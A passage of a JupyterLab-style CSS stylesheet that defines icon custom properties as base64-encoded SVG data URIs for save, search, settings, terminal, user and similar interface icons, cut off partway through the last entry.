  --jp-icon-save: url(data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICAgIDxnIGNsYXNzPSJqcC1pY29uMyIgZmlsbD0iIzYxNjE2MSI+CiAgICAgICAgPHBhdGggZD0iTTE3IDNINWMtMS4xMSAwLTIgLjktMiAydjE0YzAgMS4xLjg5IDIgMiAyaDE0YzEuMSAwIDItLjkgMi0yVjdsLTQtNHptLTUgMTZjLTEuNjYgMC0zLTEuMzQtMy0zczEuMzQtMyAzLTMgMyAxLjM0IDMgMy0xLjM0IDMtMyAzem0zLTEwSDVWNWgxMHY0eiIvPgogICAgPC9nPgo8L3N2Zz4K);
  --jp-icon-search: url(data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMTggMTgiIHdpZHRoPSIxNiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiM2MTYxNjEiPgogICAgPHBhdGggZD0iTTEyLjEsMTAuOWgtMC43bC0wLjItMC4yYzAuOC0wLjksMS4zLTIuMiwxLjMtMy41YzAtMy0yLjQtNS40LTUuNC01LjRTMS44LDQuMiwxLjgsNy4xczIuNCw1LjQsNS40LDUuNCBjMS4zLDAsMi41LTAuNSwzLjUtMS4zbDAuMiwwLjJ2MC43bDQuMSw0LjFsMS4yLTEuMkwxMi4xLDEwLjl6IE03LjEsMTAuOWMtMi4xLDAtMy43LTEuNy0zLjctMy43czEuNy0zLjcsMy43LTMuN3MzLjcsMS43LDMuNywzLjcgUzkuMiwxMC45LDcuMSwxMC45eiIvPgogIDwvZz4KPC9zdmc+Cg==);
  --jp-icon-settings: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICA8cGF0aCBjbGFzcz0ianAtaWNvbjMganAtaWNvbi1zZWxlY3RhYmxlIiBmaWxsPSIjNjE2MTYxIiBkPSJNMTkuNDMgMTIuOThjLjA0LS4zMi4wNy0uNjQuMDctLjk4cy0uMDMtLjY2LS4wNy0uOThsMi4xMS0xLjY1Yy4xOS0uMTUuMjQtLjQyLjEyLS42NGwtMi0zLjQ2Yy0uMTItLjIyLS4zOS0uMy0uNjEtLjIybC0yLjQ5IDFjLS41Mi0uNC0xLjA4LS43My0xLjY5LS45OGwtLjM4LTIuNjVBLjQ4OC40ODggMCAwMDE0IDJoLTRjLS4yNSAwLS40Ni4xOC0uNDkuNDJsLS4zOCAyLjY1Yy0uNjEuMjUtMS4xNy41OS0xLjY5Ljk4bC0yLjQ5LTFjLS4yMy0uMDktLjQ5IDAtLjYxLjIybC0yIDMuNDZjLS4xMy4yMi0uMDcuNDkuMTIuNjRsMi4xMSAxLjY1Yy0uMDQuMzItLjA3LjY1LS4wNy45OHMuMDMuNjYuMDcuOThsLTIuMTEgMS42NWMtLjE5LjE1LS4yNC40Mi0uMTIuNjRsMiAzLjQ2Yy4xMi4yMi4zOS4zLjYxLjIybDIuNDktMWMuNTIuNCAxLjA4LjczIDEuNjkuOThsLjM4IDIuNjVjLjAzLjI0LjI0LjQyLjQ5LjQyaDRjLjI1IDAgLjQ2LS4xOC40OS0uNDJsLjM4LTIuNjVjLjYxLS4yNSAxLjE3LS41OSAxLjY5LS45OGwyLjQ5IDFjLjIzLjA5LjQ5IDAgLjYxLS4yMmwyLTMuNDZjLjEyLS4yMi4wNy0uNDktLjEyLS42NGwtMi4xMS0xLjY1ek0xMiAxNS41Yy0xLjkzIDAtMy41LTEuNTctMy41LTMuNXMxLjU3LTMuNSAzLjUtMy41IDMuNSAxLjU3IDMuNSAzLjUtMS41NyAzLjUtMy41IDMuNXoiLz4KPC9zdmc+Cg==);
  --jp-icon-share: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYiIHZpZXdCb3g9IjAgMCAyNCAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiM2MTYxNjEiPgogICAgPHBhdGggZD0iTSAxOCAyIEMgMTYuMzU0OTkgMiAxNSAzLjM1NDk5MDQgMTUgNSBDIDE1IDUuMTkwOTUyOSAxNS4wMjE3OTEgNS4zNzcxMjI0IDE1LjA1NjY0MSA1LjU1ODU5MzggTCA3LjkyMTg3NSA5LjcyMDcwMzEgQyA3LjM5ODUzOTkgOS4yNzc4NTM5IDYuNzMyMDc3MSA5IDYgOSBDIDQuMzU0OTkwNCA5IDMgMTAuMzU0OTkgMyAxMiBDIDMgMTMuNjQ1MDEgNC4zNTQ5OTA0IDE1IDYgMTUgQyA2LjczMjA3NzEgMTUgNy4zOTg1Mzk5IDE0LjcyMjE0NiA3LjkyMTg3NSAxNC4yNzkyOTcgTCAxNS4wNTY2NDEgMTguNDM5NDUzIEMgMTUuMDIxNTU1IDE4LjYyMTUxNCAxNSAxOC44MDgzODYgMTUgMTkgQyAxNSAyMC42NDUwMSAxNi4zNTQ5OSAyMiAxOCAyMiBDIDE5LjY0NTAxIDIyIDIxIDIwLjY0NTAxIDIxIDE5IEMgMjEgMTcuMzU0OTkgMTkuNjQ1MDEgMTYgMTggMTYgQyAxNy4yNjc0OCAxNiAxNi42MDE1OTMgMTYuMjc5MzI4IDE2LjA3ODEyNSAxNi43MjI2NTYgTCA4Ljk0MzM1OTQgMTIuNTU4NTk0IEMgOC45NzgyMDk1IDEyLjM3NzEyMiA5IDEyLjE5MDk1MyA5IDEyIEMgOSAxMS44MDkwNDcgOC45NzgyMDk1IDExLjYyMjg3OCA4Ljk0MzM1OTQgMTEuNDQxNDA2IEwgMTYuMDc4MTI1IDcuMjc5Mjk2OSBDIDE2LjYwMTQ2IDcuNzIyMTQ2MSAxNy4yNjc5MjMgOCAxOCA4IEMgMTkuNjQ1MDEgOCAyMSA2LjY0NTAwOTYgMjEgNSBDIDIxIDMuMzU0OTkwNCAxOS42NDUwMSAyIDE4IDIgeiBNIDE4IDQgQyAxOC41NjQxMjkgNCAxOSA0LjQzNTg3MDYgMTkgNSBDIDE5IDUuNTY0MTI5NCAxOC41NjQxMjkgNiAxOCA2IEMgMTcuNDM1ODcxIDYgMTcgNS41NjQxMjk0IDE3IDUgQyAxNyA0LjQzNTg3MDYgMTcuNDM1ODcxIDQgMTggNCB6IE0gNiAxMSBDIDYuNTY0MTI5NCAxMSA3IDExLjQzNTg3MSA3IDEyIEMgNyAxMi41NjQxMjkgNi41NjQxMjk0IDEzIDYgMTMgQyA1LjQzNTg3MDYgMTMgNSAxMi41NjQxMjkgNSAxMiBDIDUgMTEuNDM1ODcxIDUuNDM1ODcwNiAxMSA2IDExIHogTSAxOCAxOCBDIDE4LjU2NDEyOSAxOCAxOSAxOC40MzU4NzEgMTkgMTkgQyAxOSAxOS41NjQxMjkgMTguNTY0MTI5IDIwIDE4IDIwIEMgMTcuNDM1ODcxIDIwIDE3IDE5LjU2NDEyOSAxNyAxOSBDIDE3IDE4LjQzNTg3MSAxNy40MzU4NzEgMTggMTggMTggeiIvPgogIDwvZz4KPC9zdmc+Cg==);
  --jp-icon-spreadsheet: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDIyIDIyIj4KICA8cGF0aCBjbGFzcz0ianAtaWNvbi1jb250cmFzdDEganAtaWNvbi1zZWxlY3RhYmxlIiBmaWxsPSIjNENBRjUwIiBkPSJNMi4yIDIuMnYxNy42aDE3LjZWMi4ySDIuMnptMTUuNCA3LjdoLTUuNVY0LjRoNS41djUuNXpNOS45IDQuNHY1LjVINC40VjQuNGg1LjV6bS01LjUgNy43aDUuNXY1LjVINC40di01LjV6bTcuNyA1LjV2LTUuNWg1LjV2NS41aC01LjV6Ii8+Cjwvc3ZnPgo=);
  --jp-icon-stop: url(data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICAgIDxnIGNsYXNzPSJqcC1pY29uMyIgZmlsbD0iIzYxNjE2MSI+CiAgICAgICAgPHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIvPgogICAgICAgIDxwYXRoIGQ9Ik02IDZoMTJ2MTJINnoiLz4KICAgIDwvZz4KPC9zdmc+Cg==);
  --jp-icon-tab: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiM2MTYxNjEiPgogICAgPHBhdGggZD0iTTIxIDNIM2MtMS4xIDAtMiAuOS0yIDJ2MTRjMCAxLjEuOSAyIDIgMmgxOGMxLjEgMCAyLS45IDItMlY1YzAtMS4xLS45LTItMi0yem0wIDE2SDNWNWgxMHY0aDh2MTB6Ii8+CiAgPC9nPgo8L3N2Zz4K);
  --jp-icon-table-rows: url(data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICAgIDxnIGNsYXNzPSJqcC1pY29uMyIgZmlsbD0iIzYxNjE2MSI+CiAgICAgICAgPHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIvPgogICAgICAgIDxwYXRoIGQ9Ik0yMSw4SDNWNGgxOFY4eiBNMjEsMTBIM3Y0aDE4VjEweiBNMjEsMTZIM3Y0aDE4VjE2eiIvPgogICAgPC9nPgo8L3N2Zz4K);
  --jp-icon-tag: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjgiIGhlaWdodD0iMjgiIHZpZXdCb3g9IjAgMCA0MyAyOCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KCTxnIGNsYXNzPSJqcC1pY29uMyIgZmlsbD0iIzYxNjE2MSI+CgkJPHBhdGggZD0iTTI4LjgzMzIgMTIuMzM0TDMyLjk5OTggMTYuNTAwN0wzNy4xNjY1IDEyLjMzNEgyOC44MzMyWiIvPgoJCTxwYXRoIGQ9Ik0xNi4yMDk1IDIxLjYxMDRDMTUuNjg3MyAyMi4xMjk5IDE0Ljg0NDMgMjIuMTI5OSAxNC4zMjQ4IDIxLjYxMDRMNi45ODI5IDE0LjcyNDVDNi41NzI0IDE0LjMzOTQgNi4wODMxMyAxMy42MDk4IDYuMDQ3ODYgMTMuMDQ4MkM1Ljk1MzQ3IDExLjUyODggNi4wMjAwMiA4LjYxOTQ0IDYuMDY2MjEgNy4wNzY5NUM2LjA4MjgxIDYuNTE0NzcgNi41NTU0OCA2LjA0MzQ3IDcuMTE4MDQgNi4wMzA1NUM5LjA4ODYzIDUuOTg0NzMgMTMuMjYzOCA1LjkzNTc5IDEzLjY1MTggNi4zMjQyNUwyMS43MzY5IDEzLjYzOUMyMi4yNTYgMTQuMTU4NSAyMS43ODUxIDE1LjQ3MjQgMjEuMjYyIDE1Ljk5NDZMMTYuMjA5NSAyMS42MTA0Wk05Ljc3NTg1IDguMjY1QzkuMzM1NTEgNy44MjU2NiA4LjYyMzUxIDcuODI1NjYgOC4xODI4IDguMjY1QzcuNzQzNDYgOC43MDU3MSA3Ljc0MzQ2IDkuNDE3MzMgOC4xODI4IDkuODU2NjdDOC42MjM4MiAxMC4yOTY0IDkuMzM1ODIgMTAuMjk2NCA5Ljc3NTg1IDkuODU2NjdDMTAuMjE1NiA5LjQxNzMzIDEwLjIxNTYgOC43MDUzMyA5Ljc3NTg1IDguMjY1WiIvPgoJPC9nPgo8L3N2Zz4K);
  --jp-icon-terminal: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI0IDI0IiA+CiAgICA8cmVjdCBjbGFzcz0ianAtdGVybWluYWwtaWNvbi1iYWNrZ3JvdW5kLWNvbG9yIGpwLWljb24tc2VsZWN0YWJsZSIgd2lkdGg9IjIwIiBoZWlnaHQ9IjIwIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgyIDIpIiBmaWxsPSIjMzMzMzMzIi8+CiAgICA8cGF0aCBjbGFzcz0ianAtdGVybWluYWwtaWNvbi1jb2xvciBqcC1pY29uLXNlbGVjdGFibGUtaW52ZXJzZSIgZD0iTTUuMDU2NjQgOC43NjE3MkM1LjA1NjY0IDguNTk3NjYgNS4wMzEyNSA4LjQ1MzEyIDQuOTgwNDcgOC4zMjgxMkM0LjkzMzU5IDguMTk5MjIgNC44NTU0NyA4LjA4MjAzIDQuNzQ2MDkgNy45NzY1NkM0LjY0MDYyIDcuODcxMDkgNC41IDcuNzc1MzkgNC4zMjQyMiA3LjY4OTQ1QzQuMTUyMzQgNy41OTk2MSAzLjk0MzM2IDcuNTExNzIgMy42OTcyNyA3LjQyNTc4QzMuMzAyNzMgNy4yODUxNiAyLjk0MzM2IDcuMTM2NzIgMi42MTkxNCA2Ljk4MDQ3QzIuMjk0OTIgNi44MjQyMiAyLjAxNzU4IDYuNjQyNTggMS43ODcxMSA2LjQzNTU1QzEuNTYwNTUgNi4yMjg1MiAxLjM4NDc3IDUuOTg4MjggMS4yNTk3NyA1LjcxNDg0QzEuMTM0NzcgNS40Mzc1IDEuMDcyMjcgNS4xMDkzOCAxLjA3MjI3IDQuNzMwNDdDMS4wNzIyNyA0LjM5ODQ0IDEuMTI4OTEgNC4wOTU3IDEuMjQyMTkgMy44MjIyN0MxLjM1NTQ3IDMuNTQ0OTIgMS41MTU2MiAzLjMwNDY5IDEuNzIyNjYgMy4xMDE1NkMxLjkyOTY5IDIuODk4NDQgMi4xNzk2OSAyLjczNDM3IDIuNDcyNjYgMi42MDkzOEMyLjc2NTYyIDIuNDg0MzggMy4wOTE4IDIuNDA0MyAzLjQ1MTE3IDIuMzY5MTRWMS4xMDkzOEg0LjM4ODY3VjIuMzgwODZDNC43NDAyMyAyLjQyNzczIDUuMDU2NjQgMi41MjM0NCA1LjMzNzg5IDIuNjY3OTdDNS42MTkxNCAyLjgxMjUgNS44NTc0MiAzLjAwMTk1IDYuMDUyNzMgMy4yMzYzM0M2LjI1MTk1IDMuNDY2OCA2LjQwNDMgMy43NDAyMyA2LjUwOTc3IDQuMDU2NjRDNi42MTkxNCA0LjM2OTE0IDYuNjczODMgNC43MjA3IDYuNjczODMgNS4xMTEzM0g1LjA0NDkyQzUuMDQ0OTIgNC42Mzg2NyA0LjkzNzUgNC4yODEyNSA0LjcyMjY2IDQuMDM5MDZDNC41MDc4MSAzLjc5Mjk3IDQuMjE2OCAzLjY2OTkyIDMuODQ5NjEgMy42Njk5MkMzLjY1MDM5IDMuNjY5OTIgMy40NzY1NiAzLjY5NzI3IDMuMzI4MTIgMy43NTE5NUMzLjE4MzU5IDMuODAyNzMgMy4wNjQ0NSAzLjg3Njk1IDIuOTcwNyAzLjk3NDYxQzIuODc2OTUgNC4wNjgzNiAyLjgwNjY0IDQuMTc5NjkgMi43NTk3NyA0LjMwODU5QzIuNzE2OCA0LjQzNzUgMi42OTUzMSA0LjU3ODEyIDIuNjk1MzEgNC43MzA0N0MyLjY5NTMxIDQuODgyODEgMi43MTY4IDUuMDE5NTMgMi43NTk3NyA1LjE0MDYyQzIuODA2NjQgNS4yNTc4MSAyLjg4MjgxIDUuMzY3MTkgMi45ODgyOCA1LjQ2ODc1QzMuMDk3NjYgNS41NzAzMSAzLjI0MDIzIDUuNjY3OTcgMy40MTYwMiA1Ljc2MTcyQzMuNTkxOCA1Ljg1MTU2IDMuODEwNTUgNS45NDMzNiA0LjA3MjI3IDYuMDM3MTFDNC40NjY4IDYuMTg1NTUgNC44MjQyMiA2LjMzOTg0IDUuMTQ0NTMgNi41QzUuNDY0ODQgNi42NTYyNSA1LjczODI4IDYuODM5ODQgNS45NjQ4NCA3LjA1MDc4QzYuMTk1MzEgNy4yNTc4MSA2LjM3MTA5IDcuNSA2LjQ5MjE5IDcuNzc3MzRDNi42MTcxOSA4LjA1MDc4IDYuNjc5NjkgOC4zNzUgNi42Nzk2OSA4Ljc1QzYuNjc5NjkgOS4wOTM3NSA2LjYyMzA1IDkuNDA0MyA2LjUwOTc3IDkuNjgxNjRDNi4zOTY0OCA5Ljk1NTA4IDYuMjM0MzggMTAuMTkxNCA2LjAyMzQ0IDEwLjM5MDZDNS44MTI1IDEwLjU4OTggNS41NTg1OSAxMC43NSA1LjI2MTcyIDEwLjg3MTFDNC45NjQ4NCAxMC45ODgzIDQuNjMyODEgMTEuMDY0NSA0LjI2NTYyIDExLjA5OTZWMTIuMjQ4SDMuMzMzOThWMTEuMDk5NkMzLjAwMTk1IDExLjA2ODQgMi42Nzk2OSAxMC45OTYxIDIuMzY3MTkgMTAuODgyOEMyLjA1NDY5IDEwLjc2NTYgMS43NzczNCAxMC41OTc3IDEuNTM1MTYgMTAuMzc4OUMxLjI5Njg4IDEwLjE2MDIgMS4xMDU0NyA5Ljg4NDc3IDAuOTYwOTM4IDkuNTUyNzNDMC44MTY0MDYgOS4yMTY4IDAuNzQ0MTQxIDguODE0NDUgMC43NDQxNDEgOC4zNDU3SDIuMzc4OTFDMi4zNzg5MSA4LjYyNjk1IDIuNDE5OTIgOC44NjMyOCAyLjUwMTk1IDkuMDU0NjlDMi41ODM5OCA5LjI0MjE5IDIuNjg5NDUgOS4zOTI1OCAyLjgxODM2IDkuNTA1ODZDMi45NTExNyA5LjYxNTIzIDMuMTAxNTYgOS42OTMzNiAzLjI2OTUzIDkuNzQwMjNDMy40Mzc1IDkuNzg3MTEgMy42MDkzOCA5LjgxMDU1IDMuNzg1MTYgOS44MTA1NUM0LjIwMzEyIDkuODEwNTUgNC41MTk1MyA5LjcxMjg5IDQuNzM0MzggOS41MTc1OEM0Ljk0OTIyIDkuMzIyMjcgNS4wNTY2NCA5LjA3MDMxIDUuMDU2NjQgOC43NjE3MlpNMTMuNDE4IDEyLjI3MTVIOC4wNzQyMlYxMUgxMy40MThWMTIuMjcxNVoiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDMuOTUyNjQgNikiIGZpbGw9IndoaXRlIi8+Cjwvc3ZnPgo=);
  --jp-icon-text-editor: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICA8cGF0aCBjbGFzcz0ianAtdGV4dC1lZGl0b3ItaWNvbi1jb2xvciBqcC1pY29uLXNlbGVjdGFibGUiIGZpbGw9IiM2MTYxNjEiIGQ9Ik0xNSAxNUgzdjJoMTJ2LTJ6bTAtOEgzdjJoMTJWN3pNMyAxM2gxOHYtMkgzdjJ6bTAgOGgxOHYtMkgzdjJ6TTMgM3YyaDE4VjNIM3oiLz4KPC9zdmc+Cg==);
  --jp-icon-toc: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICA8ZyBjbGFzcz0ianAtaWNvbjMganAtaWNvbi1zZWxlY3RhYmxlIiBmaWxsPSIjNjE2MTYxIj4KICAgIDxwYXRoIGQ9Ik03LDVIMjFWN0g3VjVNNywxM1YxMUgyMVYxM0g3TTQsNC41QTEuNSwxLjUgMCAwLDEgNS41LDZBMS41LDEuNSAwIDAsMSA0LDcuNUExLjUsMS41IDAgMCwxIDIuNSw2QTEuNSwxLjUgMCAwLDEgNCw0LjVNNCwxMC41QTEuNSwxLjUgMCAwLDEgNS41LDEyQTEuNSwxLjUgMCAwLDEgNCwxMy41QTEuNSwxLjUgMCAwLDEgMi41LDEyQTEuNSwxLjUgMCAwLDEgNCwxMC41TTcsMTlWMTdIMjFWMTlIN000LDE2LjVBMS41LDEuNSAwIDAsMSA1LjUsMThBMS41LDEuNSAwIDAsMSA0LDE5LjVBMS41LDEuNSAwIDAsMSAyLjUsMThBMS41LDEuNSAwIDAsMSA0LDE2LjVaIiAvPgogIDwvZz4KPC9zdmc+Cg==);
  --jp-icon-tree-view: url(data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICAgIDxnIGNsYXNzPSJqcC1pY29uMyIgZmlsbD0iIzYxNjE2MSI+CiAgICAgICAgPHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIvPgogICAgICAgIDxwYXRoIGQ9Ik0yMiAxMVYzaC03djNIOVYzSDJ2OGg3VjhoMnYxMGg0djNoN3YtOGgtN3YzaC0yVjhoMnYzeiIvPgogICAgPC9nPgo8L3N2Zz4K);
  --jp-icon-trusted: url(data:image/svg+xml;base64,PHN2ZyBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI0IDI1Ij4KICAgIDxwYXRoIGNsYXNzPSJqcC1pY29uMiIgc3Ryb2tlPSIjMzMzMzMzIiBzdHJva2Utd2lkdGg9IjIiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDIgMykiIGQ9Ik0xLjg2MDk0IDExLjQ0MDlDMC44MjY0NDggOC43NzAyNyAwLjg2Mzc3OSA2LjA1NzY0IDEuMjQ5MDcgNC4xOTkzMkMyLjQ4MjA2IDMuOTMzNDcgNC4wODA2OCAzLjQwMzQ3IDUuNjAxMDIgMi44NDQ5QzcuMjM1NDkgMi4yNDQ0IDguODU2NjYgMS41ODE1IDkuOTg3NiAxLjA5NTM5QzExLjA1OTcgMS41ODM0MSAxMi42MDk0IDIuMjQ0NCAxNC4yMTggMi44NDMzOUMxNS43NTAzIDMuNDEzOTQgMTcuMzk5NSAzLjk1MjU4IDE4Ljc1MzkgNC4yMTM4NUMxOS4xMzY0IDYuMDcxNzcgMTkuMTcwOSA4Ljc3NzIyIDE4LjEzOSAxMS40NDA5QzE3LjAzMDMgMTQuMzAzMiAxNC42NjY4IDE3LjE4NDQgOS45OTk5OSAxOC45MzU0QzUuMzMzMiAxNy4xODQ0IDIuOTY5NjggMTQuMzAzMiAxLjg2MDk0IDExLjQ0MDlaIi8+CiAgICA8cGF0aCBjbGFzcz0ianAtaWNvbjIiIGZpbGw9IiMzMzMzMzMiIHN0cm9rZT0iIzMzMzMzMyIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoOCA5Ljg2NzE5KSIgZD0iTTIuODYwMTUgNC44NjUzNUwwLjcyNjU0OSAyLjk5OTU5TDAgMy42MzA0NUwyLjg2MDE1IDYuMTMxNTdMOCAwLjYzMDg3Mkw3LjI3ODU3IDBMMi44NjAxNSA0Ljg2NTM1WiIvPgo8L3N2Zz4K);
  --jp-icon-undo: url(data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIxNiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiM2MTYxNjEiPgogICAgPHBhdGggZD0iTTEyLjUgOGMtMi42NSAwLTUuMDUuOTktNi45IDIuNkwyIDd2OWg5bC0zLjYyLTMuNjJjMS4zOS0xLjE2IDMuMTYtMS44OCA1LjEyLTEuODggMy41NCAwIDYuNTUgMi4zMSA3LjYgNS41bDIuMzctLjc4QzIxLjA4IDExLjAzIDE3LjE1IDggMTIuNSA4eiIvPgogIDwvZz4KPC9zdmc+Cg==);
  --jp-icon-user: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYiIHZpZXdCb3g9IjAgMCAyNCAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiM2MTYxNjEiPgogICAgPHBhdGggZD0iTTE2IDdhNCA0IDAgMTEtOCAwIDQgNCAwIDAxOCAwek0xMiAxNGE3IDcgMCAwMC03IDdoMTRhNyA3IDAgMDAtNy03eiIvPgogIDwvZz4KPC9zdmc+Cg==);
  --jp-icon-users: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZlcnNpb249IjEuMSIgdmlld0JveD0iMCAwIDM2IDI0IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogPGcgY2xhc3M9ImpwLWljb24zIiB0cmFuc2Zvcm09Im1hdHJpeCgxLjczMjcgMCAwIDEuNzMyNyAtMy42MjgyIC4wOTk1NzcpIiBmaWxsPSIjNjE2MTYxIj4KICA8cGF0aCB0cmFuc2Zvcm09Im1hdHJpeCgxLjUsMCwwLDEuNSwwLC02KSIgZD0ibTEyLjE4NiA3LjUwOThjLTEuMDUzNSAwLTEuOTc1NyAwLjU2NjUtMi40Nzg1IDEuNDEwMiAwLjc1MDYxIDAuMzEyNzcgMS4zOTc0IDAuODI2NDggMS44NzMgMS40NzI3aDMuNDg2M2MwLTEuNTkyLTEuMjg4OS0yLjg4MjgtMi44ODA5LTIuODgyOHoiLz4KICA8cGF0aCBkPSJtMjAuNDY1IDIuMzg5NWEyLjE4ODUgMi4xODg1IDAgMCAxLTIuMTg4NCAyLjE4ODUgMi4xODg1IDIuMTg4NSAwIDAgMS0yLjE4ODUtMi4xODg1IDIuMTg4NSAyLjE4ODUgMCAwIDEgMi4xODg1LTIuMTg4NSAyLjE4ODUgMi4xODg1IDAgMCAxIDIuMTg4NCAyLjE4ODV6Ii8+CiAgPHBhdGggdHJhbnNmb3JtPSJtYXRyaXgoMS41LDAsMCwxLjUsMCwtNikiIGQ9Im0zLjU4OTggOC40MjE5Yy0xLjExMjYgMC0yLjAxMzcgMC45MDExMS0yLjAxMzcgMi4wMTM3aDIuODE0NWMwLjI2Nzk3LTAuMzczMDkgMC41OTA3LTAuNzA0MzUgMC45NTg5OC0wLjk3ODUyLTAuMzQ0MzMtMC42MTY4OC0xLjAwMzEtMS4wMzUyLTEuNzU5OC0xLjAzNTJ6Ii8+CiAgPHBhdGggZD0ibTYuOTE1NCA0LjYyM2ExLjUyOTQgMS41Mjk0IDAgMCAxLTEuNTI5NCAxLjUyOTQgMS41Mjk0IDEuNTI5NCAwIDAgMS0xLjUyOTQtMS41Mjk0IDEuNTI5NCAxLjUyOTQgMCAwIDEgMS41Mjk0LTEuNTI5NCAxLjUyOTQgMS41Mjk0IDAgMCAxIDEuNTI5NCAxLjUyOTR6Ii8+CiAgPHBhdGggZD0ibTYuMTM1IDEzLjUzNWMwLTMuMjM5MiAyLjYyNTktNS44NjUgNS44NjUtNS44NjUgMy4yMzkyIDAgNS44NjUgMi42MjU5IDUuODY1IDUuODY1eiIvPgogIDxjaXJjbGUgY3g9IjEyIiBjeT0iMy43Njg1IiByPSIyLjk2ODUiLz4KIDwvZz4KPC9zdmc+Cg==);
  --jp-icon-vega: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDIyIDIyIj4KICA8ZyBjbGFzcz0ianAtaWNvbjEganAtaWNvbi1zZWxlY3RhYmxlIiBmaWxsPSIjMjEyMTIxIj4KICAgIDxwYXRoIGQ9Ik0xMC42IDUuNGwyLjItMy4ySDIuMnY3LjNsNC02LjZ6Ii8+CiAgICA8cGF0aCBkPSJNMTUuOCAyLjJsLTQuNCA2LjZMNyA2LjNsLTQuOCA4djUuNWgxNy42VjIuMmgtNHptLTcgMTUuNEg1LjV2LTQuNGgzLjN2NC40em00LjQgMEg5LjhWOS44aDMuNHY3Ljh6bTQuNCAwaC0zLjRWNi41aDMuNHYxMS4xeiIvPgogIDwvZz4KPC9zdmc+Cg==);
  --jp-icon-word: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDIwIDIwIj4KIDxnIGNsYXNzPSJqcC1pY29uMiIgZmlsbD0iIzQxNDE0MSI+CiAgPHJlY3QgeD0iMiIgeT0iMiIgd2lkdGg9IjE2IiBoZWlnaHQ9IjE2Ii8+CiA8L2c+CiA8ZyBjbGFzcz0ianAtaWNvbi1hY2NlbnQyIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSguNDMgLjA0MDEpIiBmaWxsPSIjZmZmIj4KICA8cGF0aCBkPSJtNC4xNCA4Ljc2cTAuMDY4Mi0xLjg5IDIuNDItMS44OSAxLjE2IDAgMS42OCAwLjQyIDAuNTY3IDAuNDEgMC41NjcgMS4xNnYzLjQ3cTAgMC40NjIgMC41MTQgMC40NjIgMC4xMDMgMCAwLjItMC4wMjMxdjAuNzE0cS0wLjM5OSAwLjEwMy0wLjY1MSA